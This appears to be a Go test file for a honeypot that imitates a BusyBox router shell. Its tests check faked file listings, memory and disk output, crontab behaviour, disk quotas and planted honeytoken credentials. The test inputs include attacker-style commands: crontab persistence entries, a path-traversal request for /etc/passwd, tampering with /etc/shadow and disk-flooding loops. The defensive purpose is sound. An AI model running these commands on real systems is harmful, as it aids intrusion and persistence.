		{"ls -ld /tmp /proc",
			"dr-xr-xr-x   14 root     root             0 Nov 18 09:15 /proc\n" + // its directories: sys + 11 processes
				"drwxrwxrwt    2 root     root            40 Nov 18 09:15 /tmp\n"},
		{nippon + "ls -la",
			"total 4\n" +
				"drwxrwxrwt    3 root     root            80 Nov 18 09:15 .\n" +
				"drwxr-xr-x   15 root     root           300 Jun  4  2020 ..\n" +
				"-rw-r--r--    1 root     root             5 Nov 20 10:30 .nippon\n" +
				"drwxr-xr-x    2 root     root            40 Nov 20 10:30 d\n"},
		{"ls -l /var/www/login.cgi", // a program; /var/www is on the firmware, not in RAM like /var/run
			"-rwxr-xr-x    1 root     root         13764 Jun  4  2020 /var/www/login.cgi\n"},
		{"ls -l /etc/dropbear", // Dropbear's format: 140 bytes, 141 for a private number with its top bit set
			"total 4\n-rw-------    1 root     root           140 Jun  4  2020 dropbear_ecdsa_host_key\n"},
		{"echo x >> /etc/shadow; ls -l /etc/shadow", // overwriting keeps the mode, the date changes
			"-rw-------    1 root     root           303 Nov 20 10:30 /etc/shadow\n"},
	}
	for _, tt := range tests {
		got, _, _ := noColors().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// Columns go top to bottom, then left to right, each as wide as the longest name + 2 (BusyBox).
func TestColumns(t *testing.T) {
	names := []string{"ash", "busybox", "cat", "chmod", "cp", "echo", "false", "grep", "hostname", "kill",
		"login", "ls", "mkdir", "mv", "ps", "pwd", "rm", "sh", "sleep", "touch", "true", "uname"}
	want := "ash       cp        hostname  mkdir     rm        true\n" +
		"busybox   echo      kill      mv        sh        uname\n" +
		"cat       false     login     ps        sleep\n" +
		"chmod     grep      ls        pwd       touch\n"
	if got := columns(names, names, false); got != want {
		t.Errorf("columns:\n%s\nwant:\n%s", got, want)
	}

	long := strings.Repeat("x", 80) // wider than the terminal -> one name per line
	if got := columns([]string{long, "y"}, []string{long, "y"}, false); got != long+"\ny\n" {
		t.Errorf("a name wider than the terminal: %q", got)
	}
}

// Every applet link must work as a command: an "ls /bin" entry that answers "not found" gives us away.
func TestAppletsAreImplemented(t *testing.T) {
	for p, target := range fakeLinks {
		if path.Base(target) != "busybox" || under(p, "/proc") {
			continue // the C library links; /proc/1/exe runs as "exe", which no applet is (TestProc)
		}
		if out, code, _ := NewShell().command([]string{p}, ""); code == 127 {
			t.Errorf("%s -> %s is listed but not implemented: %q", p, target, out)
		}
	}
}

// Every path ps shows (programs, the pid file, /bin/login) must exist: an attacker can ls -l it.
func TestPsMatchesFiles(t *testing.T) {
	sh := NewShell()
	for _, line := range strings.Split(fakePS, "\n") {
		fields := strings.Fields(line)
		for _, f := range fields[min(4, len(fields)):] { // the COMMAND column and its arguments
			if _, ok := sh.readFile(f); strings.HasPrefix(f, "/") && !ok {
				t.Errorf("ps shows %s, which does not exist", f)
			}
		}
	}
}

// "busybox" alone: BusyBox 1.30.1's own text, then the applets wrapped like appletlib.c does
// (a new line when col >= 79 - (len + 2); the tab counts as 6).
func TestBusyboxHelp(t *testing.T) {
	out, _, _ := NewShell().Run("busybox")
	if !strings.HasPrefix(out, "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n") {
		t.Errorf("first line: %q", strings.SplitN(out, "\n", 2)[0])
	}
	want := "Currently defined functions:\n" +
		"\t[, [[, ash, awk, cat, chmod, cp, crontab, cut, date, df, echo, egrep,\n" +
		"\tenv, false, fgrep, free, ftpget, grep, head, hostname, id, init, kill,\n" +
		"\tkillall, klogd, login, ls, mkdir, mv, nohup, nproc, printf, ps, pwd,\n" +
		"\trm, sed, seq, sh, sleep, sort, sync, sysctl, syslogd, tail, telnetd,\n" +
		"\ttest, tftp, touch, tr, true, uname, uniq, uptime, w, wc, wget, which,\n" +
		"\twho, whoami\n"
	if !strings.HasSuffix(out, want) {
		t.Errorf("applet list:\n%s\nwant:\n%s", out[strings.Index(out, "Currently"):], want)
	}
}

// The web server's files come from /var/www; ".." can't leave it (lighttpd cleans the path too).
func TestWebFile(t *testing.T) {
	tests := []struct {
		path   string
		exists bool
	}{
		{"/", true}, // index-file.names: index.html
		{"/index.html", true},
		{"/login.cgi", true},
		{"/login", false},
		{"/../../etc/passwd", false}, // = /var/www/etc/passwd, not /etc/passwd
		{"/etc/passwd", false},
		{"/var/www/index.html", false}, // a URL path, not a filesystem path
	}
	for _, tt := range tests {
		if _, ok := WebFile(tt.path); ok != tt.exists {
			t.Errorf("WebFile(%q): exists = %v, want %v", tt.path, ok, tt.exists)
		}
	}
	if page, _ := WebFile("/"); page != LoginPage(false) {
		t.Error("/ is not the login page")
	}
}

// What cryptominers check before installing: the output of BusyBox 1.30.1 (its printf formats) with
// Buildroot's config, the numbers from /proc/meminfo, /proc/cpuinfo and /proc/mounts.
func TestMinerCommands(t *testing.T) {
	fixedClock(t) // now Nov 20 10:30:00, boot Nov 18 09:15:00 = up 2 days 1:15
	const crontabUsage = "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
		"Usage: crontab [-c DIR] [-u USER] [-ler]|[FILE]\n\n" +
		"\t-c\tCrontab directory\n\t-u\tUser\n\t-l\tList crontab\n\t-e\tEdit crontab\n" +
		"\t-r\tDelete crontab\n\tFILE\tReplace crontab by FILE ('-': stdin)\n"
	tests := []struct{ line, want string }{
		// free: total = MemTotal, free = MemFree, shared = Shmem, buff/cache = Buffers + Cached,
		// used = the rest, available = MemAvailable; no swap
		{"free", "              total        used        free      shared  buff/cache   available\n" +
			"Mem:         124520       58608       38412         312       27500       61208\n" +
			"Swap:             0           0           0\n"},
		{"free -m | grep Mem", "Mem:            121          57          37           0          26          59\n"},
		{"free -h", "BusyBox v1.30.1 (2020-06-04 12:00:00 UTC) multi-call binary.\n\n" +
			"Usage: free [-b/k/m/g]\n\nDisplay the amount of free and used system memory\n"},
		{"nproc", "1\n"}, // one "processor" in /proc/cpuinfo
		{"nproc --all", "1\n"},

		{"uptime", " 10:30:00 up 2 days,  1:15,  load average: 0.08, 0.03, 0.01\n"},
		{"uptime -s", "2026-11-18 09:15:00\n"},
		{"cat /proc/uptime /proc/loadavg", "177300.00 173754.00\n0.08 0.03 0.01 1/11 530\n"}, // 11 processes in ps

		// df: the two tmpfs from /proc/mounts (rootfs, proc and sysfs have no blocks); /tmp gets
		// half the RAM (62260K), /dev its size=512k
		{"df", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                    62260         0     62260   0% /tmp\n" +
			"tmpfs                      512         0       512   0% /dev\n"},
		{"df -h", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M         0     60.8M   0% /tmp\n" +
			"tmpfs                   512.0K         0    512.0K   0% /dev\n"},
		{"cd /tmp; echo kami > .x; df -h .", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M      4.0K     60.8M   0% /tmp\n"}, // a file takes a whole 4K page
		{"echo kami > /tmp/x; df -m | grep /tmp", "tmpfs                       61         0        61   0% /tmp\n"},
		{"cp /etc/passwd /dev/shm/p; df /dev/shm", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                      512         4       508   1% /dev\n"}, // 1 page of 128: (100 + 64) / 128
		{"df -T | grep Filesystem", "Filesystem           Type       1K-blocks      Used Available Use% Mounted on\n"},
		{"df /proc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"proc                         0         0         0   0% /proc\n"},
		{"df /etc", "Filesystem           1K-blocks      Used Available Use% Mounted on\n"}, // on rootfs: left out
		{"df /nope", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"df: /nope: can't find mount point\n"},

		// crontab: how miners come back after a reboot
		{"crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{`(crontab -l 2>/dev/null; echo "*/5 * * * * /tmp/x") | crontab -; crontab -l`, "*/5 * * * * /tmp/x\n"},
		{"echo '* * * * * a' | crontab -; crontab -r; crontab -l", "crontab: can't open 'root': No such file or directory\n"},
		{"echo '@reboot /tmp/x' > /tmp/c; crontab /tmp/c; ls /var/spool/cron/crontabs; cat /var/spool/cron/crontabs/cron.update",
			"cron.update  root\nroot\n"},
		{"crontab /tmp/nope", "crontab: can't open '/tmp/nope': No such file or directory\n"},
		{"crontab -u admin -l", "crontab: can't open 'admin': No such file or directory\n"},
		{"crontab -u bob -l", "crontab: unknown user bob\n"},
		{"crontab -e; crontab -l && echo empty", "crontab: can't execute 'vi': No such file or directory\nempty\n"},
		{"crontab", crontabUsage},
		{"crontab -l -r", crontabUsage},

		// a subshell's commands are one group: | gets all their output
		{"(echo a; echo b) | grep b", "b\n"},
		{"(echo a; echo b) | grep a", "a\n"},
		{"(echo a; echo b)", "a\nb\n"},
		{"echo x; (echo a) | grep a; echo y | grep y", "x\na\ny\n"},
		{"echo $(id)", "uid=0(root) gid=0(root) groups=0(root)\n"},
		{"echo '* * * * * one' | crontab -; (crontab -l; echo '* * * * * two') | crontab -; crontab -l",
			"* * * * * one\n* * * * * two\n"}, // a bot that comes twice keeps its first job too
	}
	for _, tt := range tests {
		got, _, _ := noColors().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}
}

// A session's files get 256KB in all (sessionQuota). Then every way of writing fails like on a full
// disk, with BusyBox's own messages, df shows it full, and rm frees space again. One shell, in order.
func TestDiskQuota(t *testing.T) {
	sh := NewShell()
	page := "echo " + strings.Repeat("a", 4095) // prints exactly one 4KB page (with the \n)
	n := 0                                      // one-page files written before the disk was full
	for ; n < 100; n++ {
		if out, code, _ := sh.Run(fmt.Sprintf("%s > /tmp/f%d", page, n)); out != "" || code != 0 {
			if out != "sh: write error: No space left on device\n" || code != 1 {
				t.Fatalf("file %d: %q, exit code %d (expected echo's write error, 1)", n, out, code)
			}
			break
		}
	}
	// each file costs its page + its name + 256 (the "inode"): f0-f9 4359, f10-f59 4360, so 60 fit
	// (554 left); f60 still gets its name and inode (264), not its page: 290 bytes left
	if left := sessionQuota - sh.quotaUsed(); n != 60 || left != 290 {
		t.Fatalf("%d one-page files fit, %d bytes left (expected 60 and 290)", n, left)
	}

	tests := []struct {
		line string
		want string
		code int
	}{
		{"cat /tmp/f60; echo end", "end\n", 0}, // the file that didn't fit exists, empty
		// df: Used = the 60 pages, nothing Available, 100% (df.c: used / (used + available))
		{"df /tmp /dev", "Filesystem           1K-blocks      Used Available Use% Mounted on\n" +
			"tmpfs                    62260       240         0 100% /tmp\n" +
			"tmpfs                      512         0         0   0% /dev\n", 0},
		{"df -h /tmp", "Filesystem                Size      Used Available Use% Mounted on\n" +
			"tmpfs                    60.8M    240.0K         0 100% /tmp\n", 0},
		{"echo hi >> /tmp/f0", "sh: write error: No space left on device\n", 1}, // f0's page is full
		{"echo hi >> /tmp/f1 2>/dev/null", "", 1},
		{"cat /tmp/f1 | grep a", strings.Repeat("a", 4095) + "\n", 0},                  // f1 kept its page, without "hi"
		{"cat /etc/passwd > /tmp/c", "cat: write error: No space left on device\n", 1}, // name fits, page doesn't
		// 28 bytes left: not even an empty file fits now (like running out of inodes)
		{"cp /etc/passwd /tmp/p", "cp: can't create '/tmp/p': No space left on device\n", 1},
		{"touch /tmp/t", "touch: /tmp/t: No space left on device\n", 1},
		{"mkdir /tmp/d", "mkdir: can't create directory '/tmp/d': No space left on device\n", 1},
		{"echo x > /tmp/n", "-sh: can't create /tmp/n: No space left on device\n", 1},
		{"echo '* * * * * /tmp/x' | crontab -", "crontab: can't create /var/spool/cron/crontabs/root.new\n", 0},
		// rm frees space: 290 again, the crontab's name fits, its line doesn't (and BusyBox exits 0)
		{"rm /tmp/c; echo '* * * * * /tmp/x' | crontab -", "crontab: write error: No space left on device\n", 0},
		{"rm /tmp/f0 /tmp/f1; echo hi > /tmp/f0; cat /tmp/f0", "hi\n", 0},
		{"touch /tmp/q; cp /tmp/f2 /tmp/p", "cp: write error: No space left on device\n", 1}, // 3840 left for p
	}
	for _, tt := range tests {
		if got, code, _ := sh.Run(tt.line); got != tt.want || code != tt.code {
			t.Errorf("Run(%q)\n got: %q, exit code %d\nwant: %q, exit code %d", tt.line, got, code, tt.want, tt.code)
		}
	}
}

// Whatever a session does (the attacks found on 20.11: many copies of a big file, many empty files,
// many directories, in one long SSH command), what it keeps in RAM stays around sessionQuota.
// Measured for real (heap): a cut string can keep far more memory alive than its length says.
func TestDiskQuotaBoundsMemory(t *testing.T) {
	heap := func() int64 {
		runtime.GC()
		var m runtime.MemStats
		runtime.ReadMemStats(&m)
		return int64(m.HeapAlloc)
	}
	for _, command := range []string{"cat /tmp/b > /tmp/f%d; ", "touch /tmp/e%d; ", "mkdir /tmp/d%d; "} {
		var line strings.Builder
		for i := range 3000 {
			fmt.Fprintf(&line, command, i)
		}
		attack := func() *Shell {
			sh := NewShell()
			sh.Run("echo " + strings.Repeat("b", maxSize) + " > /tmp/b") // 16KB, the most one file can hold
			sh.Run(line.String())
			return sh
		}

		start := heap()
		shells := []*Shell{attack(), attack(), attack(), attack()}
		perShell := (heap() - start) / int64(len(shells))
		if perShell > sessionQuota*3/2 { // the files + the maps around them (measured: at most ~260KB)
			t.Errorf("%q x 3000: one session keeps %d bytes in RAM (quota %d)", command, perShell, sessionQuota)
		}

		sh := shells[0]
		bytes := 0 // names + contents
		for p, content := range sh.files {
			bytes += len(p) + len(content)
		}
		for p := range sh.dirs {
			bytes += len(p)
		}
		entries := len(sh.files) + len(sh.dirs)
		if used := sh.quotaUsed(); used > sessionQuota || bytes > sessionQuota || entries > sessionQuota/256 {
			t.Errorf("%q x 3000: used %d of %d, %d bytes in %d files and directories",
				command, used, sessionQuota, bytes, entries)
		}
		runtime.KeepAlive(shells)
	}
}

// The honeytokens are where an attacker looks for them, and the programs that use those files run.
func TestHoneytokens(t *testing.T) {
	fixedClock(t)
	tests := []struct{ line, want string }{
		{"grep wpa_passphrase /etc/hostapd.conf", "wpa_passphrase=w7Kq2mVx9pLz\n"},
		{"cat /etc/ppp/chap-secrets | grep 2210417553", "\"2210417553\"\t*\t\"Rp4tHx92kQ\"\t*\n"},
		{"grep user /etc/ppp/peers/isp", "user \"2210417553\"\n"}, // the same account in both pppd files
		{"ps | grep hostapd", "  362 root      1840 S    /usr/sbin/hostapd -B /etc/hostapd.conf\n"},
		{"ps | grep pppd", "  377 root      1216 S    /usr/sbin/pppd call isp\n"},
		{"ls -l /etc/ppp", "total 4\n-rw-------    1 root     root           108 Jun  4  2020 chap-secrets\n" +
			"drwxr-xr-x    2 root     root            60 Jun  4  2020 peers\n"},
		{"ls /usr/lib/pppd/2.4.7", "rp-pppoe.so\n"}, // the plugin named in /etc/ppp/peers/isp
	}
	for _, tt := range tests {
		got, _, _ := noColors().Run(tt.line)
		if got != tt.want {
			t.Errorf("Run(%q)\n got: %q\nwant: %q", tt.line, got, tt.want)
		}
	}

	// a honeytoken found in a password list would no longer prove that someone read the file
	shadow := fakeFiles["/etc/shadow"] + fakeFiles["/etc/passwd"]
	for _, token := range []string{wifiPassphrase, pppoeUser, pppoePassword} {
		if strings.Contains(shadow, token) {
			t.Errorf("honeytoken %q is in /etc/passwd or /etc/shadow", token)
		}
	}
}

// /proc/meminfo in the kernel's format: "Name:" padded to 16, the value in 8 columns, " kB".
func TestMeminfo(t *testing.T) {
	out, _, _ := NewShell().Run("cat /proc/meminfo")
	lines := strings.Split(strings.TrimSuffix(out, "\n"), "\n")
	if len(lines) < 30 || lines[0] != "MemTotal:         124520 kB" {
		t.Fatalf("%d lines, the first %q", len(lines), lines[0])
	}
	for _, l := range lines {
		if len(l) != 27 || !strings.HasSuffix(l, " kB") {
			t.Errorf("not in the kernel's format: %q", l)
		}
	}
}
